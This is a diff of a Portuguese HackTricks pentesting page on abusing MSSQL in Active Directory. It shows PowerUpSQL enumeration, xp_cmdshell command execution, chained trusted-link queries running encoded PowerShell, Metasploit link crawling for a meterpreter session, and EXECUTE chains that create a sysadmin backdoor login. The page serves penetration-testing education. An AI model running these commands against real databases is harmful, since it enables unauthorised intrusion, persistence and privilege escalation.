@@ -1,22 +1,25 @@
-# Abuso do MSSQL AD
+# MSSQL AD Abuse
+
+{% hint style="success" %}
+Aprenda e pratique Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Aprenda e pratique Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary><strong>Aprenda hacking AWS do zero ao herói com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary>Support HackTricks</summary>
 
-* Você trabalha em uma **empresa de cibersegurança**? Você quer ver sua **empresa anunciada no HackTricks**? ou quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
-* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
-* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
-* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **Compartilhe seus truques de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e** [**repositório hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).
+* Confira os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
+* **Junte-se ao** 💬 [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga**-nos no **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Compartilhe truques de hacking enviando PRs para os repositórios do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).
 
 </details>
+{% endhint %}
 
 <figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://websec.nl/" %}
 
-## **Enumeração / Descoberta do MSSQL**
+## **Enumeração / Descoberta MSSQL**
 
 O módulo powershell [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL) é muito útil neste caso.
 ```powershell
@@ -55,9 +58,9 @@ Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose
 # Get DBs, test connections and get info in oneliner
 Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" } | Get-SQLServerInfo
 ```
-## Abuso Básico do MSSQL
+## MSSQL Abuso Básico
 
-### Acessar Banco de Dados
+### Acessar DB
 ```powershell
 #Perform a SQL query
 Get-SQLQuery -Instance "sql.domain.io,1433" -Query "select @@servername"
@@ -71,24 +74,24 @@ Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" }
 ```
 ### MSSQL RCE
 
-Também pode ser possível **executar comandos** dentro do host MSSQL
+Pode também ser possível **executar comandos** dentro do host MSSQL
 ```powershell
 Invoke-SQLOSCmd -Instance "srv.sub.domain.local,1433" -Command "whoami" -RawResults
 # Invoke-SQLOSCmd automatically checks if xp_cmdshell is enable and enables it if necessary
 ```
-### Truques Básicos de Hacking do MSSQL
+Verifique na página mencionada na **seção seguinte como fazer isso manualmente.**
 
-Verifique na página mencionada na **seção seguinte como fazer isso manualmente**.
+### Truques Básicos de Hacking MSSQL
 
 {% content-ref url="../../network-services-pentesting/pentesting-mssql-microsoft-sql-server/" %}
 [pentesting-mssql-microsoft-sql-server](../../network-services-pentesting/pentesting-mssql-microsoft-sql-server/)
 {% endcontent-ref %}
 
-## Links Confiáveis do MSSQL
+## Links Confiáveis MSSQL
 
-Se uma instância do MSSQL é confiável (link de banco de dados) por uma instância diferente do MSSQL. Se o usuário tiver privilégios sobre o banco de dados confiável, ele será capaz de **usar o relacionamento de confiança para executar consultas também na outra instância**. Essas confianças podem ser encadeadas e, em algum momento, o usuário pode ser capaz de encontrar algum banco de dados mal configurado onde ele pode executar comandos.
+Se uma instância MSSQL é confiável (link de banco de dados) por uma instância MSSQL diferente. Se o usuário tem privilégios sobre o banco de dados confiável, ele poderá **usar o relacionamento de confiança para executar consultas também na outra instância**. Essas confianças podem ser encadeadas e, em algum momento, o usuário pode ser capaz de encontrar algum banco de dados mal configurado onde ele pode executar comandos.
 
-**Os links entre bancos de dados funcionam mesmo através de confianças entre florestas.**
+**Os links entre bancos de dados funcionam mesmo através de confianças de floresta.**
 
 ### Abuso do Powershell
 ```powershell
@@ -124,19 +127,21 @@ Get-SQLQuery -Instance "sql.rto.local,1433" -Query 'SELECT * FROM OPENQUERY("sql
 ```
 ### Metasploit
 
-Você pode facilmente verificar links confiáveis usando o Metasploit.
+Você pode verificar facilmente links confiáveis usando metasploit.
 ```bash
 #Set username, password, windows auth (if using AD), IP...
 msf> use exploit/windows/mssql/mssql_linkcrawler
 [msf> set DEPLOY true] #Set DEPLOY to true if you want to abuse the privileges to obtain a meterpreter session
 ```
+Note que o metasploit tentará abusar apenas da função `openquery()` no MSSQL (então, se você não conseguir executar comandos com `openquery()`, precisará tentar o método `EXECUTE` **manualmente** para executar comandos, veja mais abaixo.)
+
 ### Manual - Openquery()
 
-A partir do **Linux**, você pode obter um shell de console MSSQL com **sqsh** e **mssqlclient.py**.
+A partir do **Linux**, você pode obter um shell de console MSSQL com **sqsh** e **mssqlclient.py.**
 
-No **Windows**, você também pode encontrar os links e executar comandos manualmente usando um **cliente MSSQL como** [**HeidiSQL**](https://www.heidisql.com)
+A partir do **Windows**, você também pode encontrar os links e executar comandos manualmente usando um **cliente MSSQL como** [**HeidiSQL**](https://www.heidisql.com)
 
-_Login usando autenticação do Windows:_
+_Faça login usando autenticação do Windows:_
 
 ![](<../../.gitbook/assets/image (808).png>)
 
@@ -147,14 +152,14 @@ EXEC sp_linkedservers;
 ```
 ![](<../../.gitbook/assets/image (716).png>)
 
-#### Executar consultas em link confiável
+#### Execute queries in trustable link
 
-Execute consultas através do link (exemplo: encontrar mais links na nova instância acessível):
+Execute queries através do link (exemplo: encontre mais links na nova instância acessível):
 ```sql
 select * from openquery("dcorp-sql1", 'select * from master..sysservers')
 ```
 {% hint style="warning" %}
-Verifique onde as aspas duplas e simples são usadas, é importante usá-las dessa maneira.
+Verifique onde aspas duplas e simples são usadas, é importante usá-las dessa forma.
 {% endhint %}
 
 ![](<../../.gitbook/assets/image (643).png>)
@@ -167,11 +172,11 @@ SELECT * FROM OPENQUERY("<computer>", 'select @@servername; exec xp_cmdshell ''p
 # Second level RCE
 SELECT * FROM OPENQUERY("<computer1>", 'select * from openquery("<computer2>", ''select @@servername; exec xp_cmdshell ''''powershell -enc blah'''''')')
 ```
-Se não conseguir realizar ações como `exec xp_cmdshell` a partir de `openquery()`, tente com o método `EXECUTE`.
+Se você não consegue realizar ações como `exec xp_cmdshell` a partir de `openquery()`, tente com o método `EXECUTE`.
 
 ### Manual - EXECUTE
 
-Também é possível abusar de links confiáveis usando `EXECUTE`:
+Você também pode abusar de links confiáveis usando `EXECUTE`:
 ```bash
 #Create user and give admin privileges
 EXECUTE('EXECUTE(''CREATE LOGIN hacker WITH PASSWORD = ''''P@ssword123.'''' '') AT "DOMINIO\SERVER1"') AT "DOMINIO\SERVER2"
@@ -179,9 +184,9 @@ EXECUTE('EXECUTE(''sp_addsrvrolemember ''''hacker'''' , ''''sysadmin'''' '') AT 
 ```
 ## Escalação de Privilégios Local
 
-O usuário local do **MSSQL** geralmente possui um tipo especial de privilégio chamado **`SeImpersonatePrivilege`**. Isso permite que a conta "impersonate a client after authentication" (impersonar um cliente após autenticação).
+O **usuário local do MSSQL** geralmente possui um tipo especial de privilégio chamado **`SeImpersonatePrivilege`**. Isso permite que a conta "imite um cliente após a autenticação".
 
-Uma estratégia que muitos autores desenvolveram é forçar um serviço **SYSTEM** a se autenticar em um serviço falso ou de intermediário criado pelo atacante. Esse serviço falso é então capaz de se passar pelo serviço **SYSTEM** enquanto ele está tentando se autenticar.
+Uma estratégia que muitos autores desenvolveram é forçar um serviço do SYSTEM a se autenticar em um serviço malicioso ou man-in-the-middle que o atacante cria. Esse serviço malicioso pode então imitar o serviço do SYSTEM enquanto tenta se autenticar.
 
 [SweetPotato](https://github.com/CCob/SweetPotato) possui uma coleção dessas várias técnicas que podem ser executadas através do comando `execute-assembly` do Beacon.
 
@@ -189,14 +194,17 @@ Uma estratégia que muitos autores desenvolveram é forçar um serviço **SYSTEM
 
 {% embed url="https://websec.nl/" %}
 
+{% hint style="success" %}
+Aprenda e pratique Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Aprenda e pratique Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>Aprenda hacking na AWS do zero ao herói com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary>Suporte ao HackTricks</summary>
 
-* Você trabalha em uma **empresa de cibersegurança**? Quer ver sua **empresa anunciada no HackTricks**? ou quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
-* Descubra [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
-* Adquira o [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **Compartilhe seus truques de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e** [**repositório hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).
+* Confira os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
+* **Junte-se ao** 💬 [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga**-nos no **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Compartilhe truques de hacking enviando PRs para os repositórios do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).
 
 </details>
+{% endhint %}
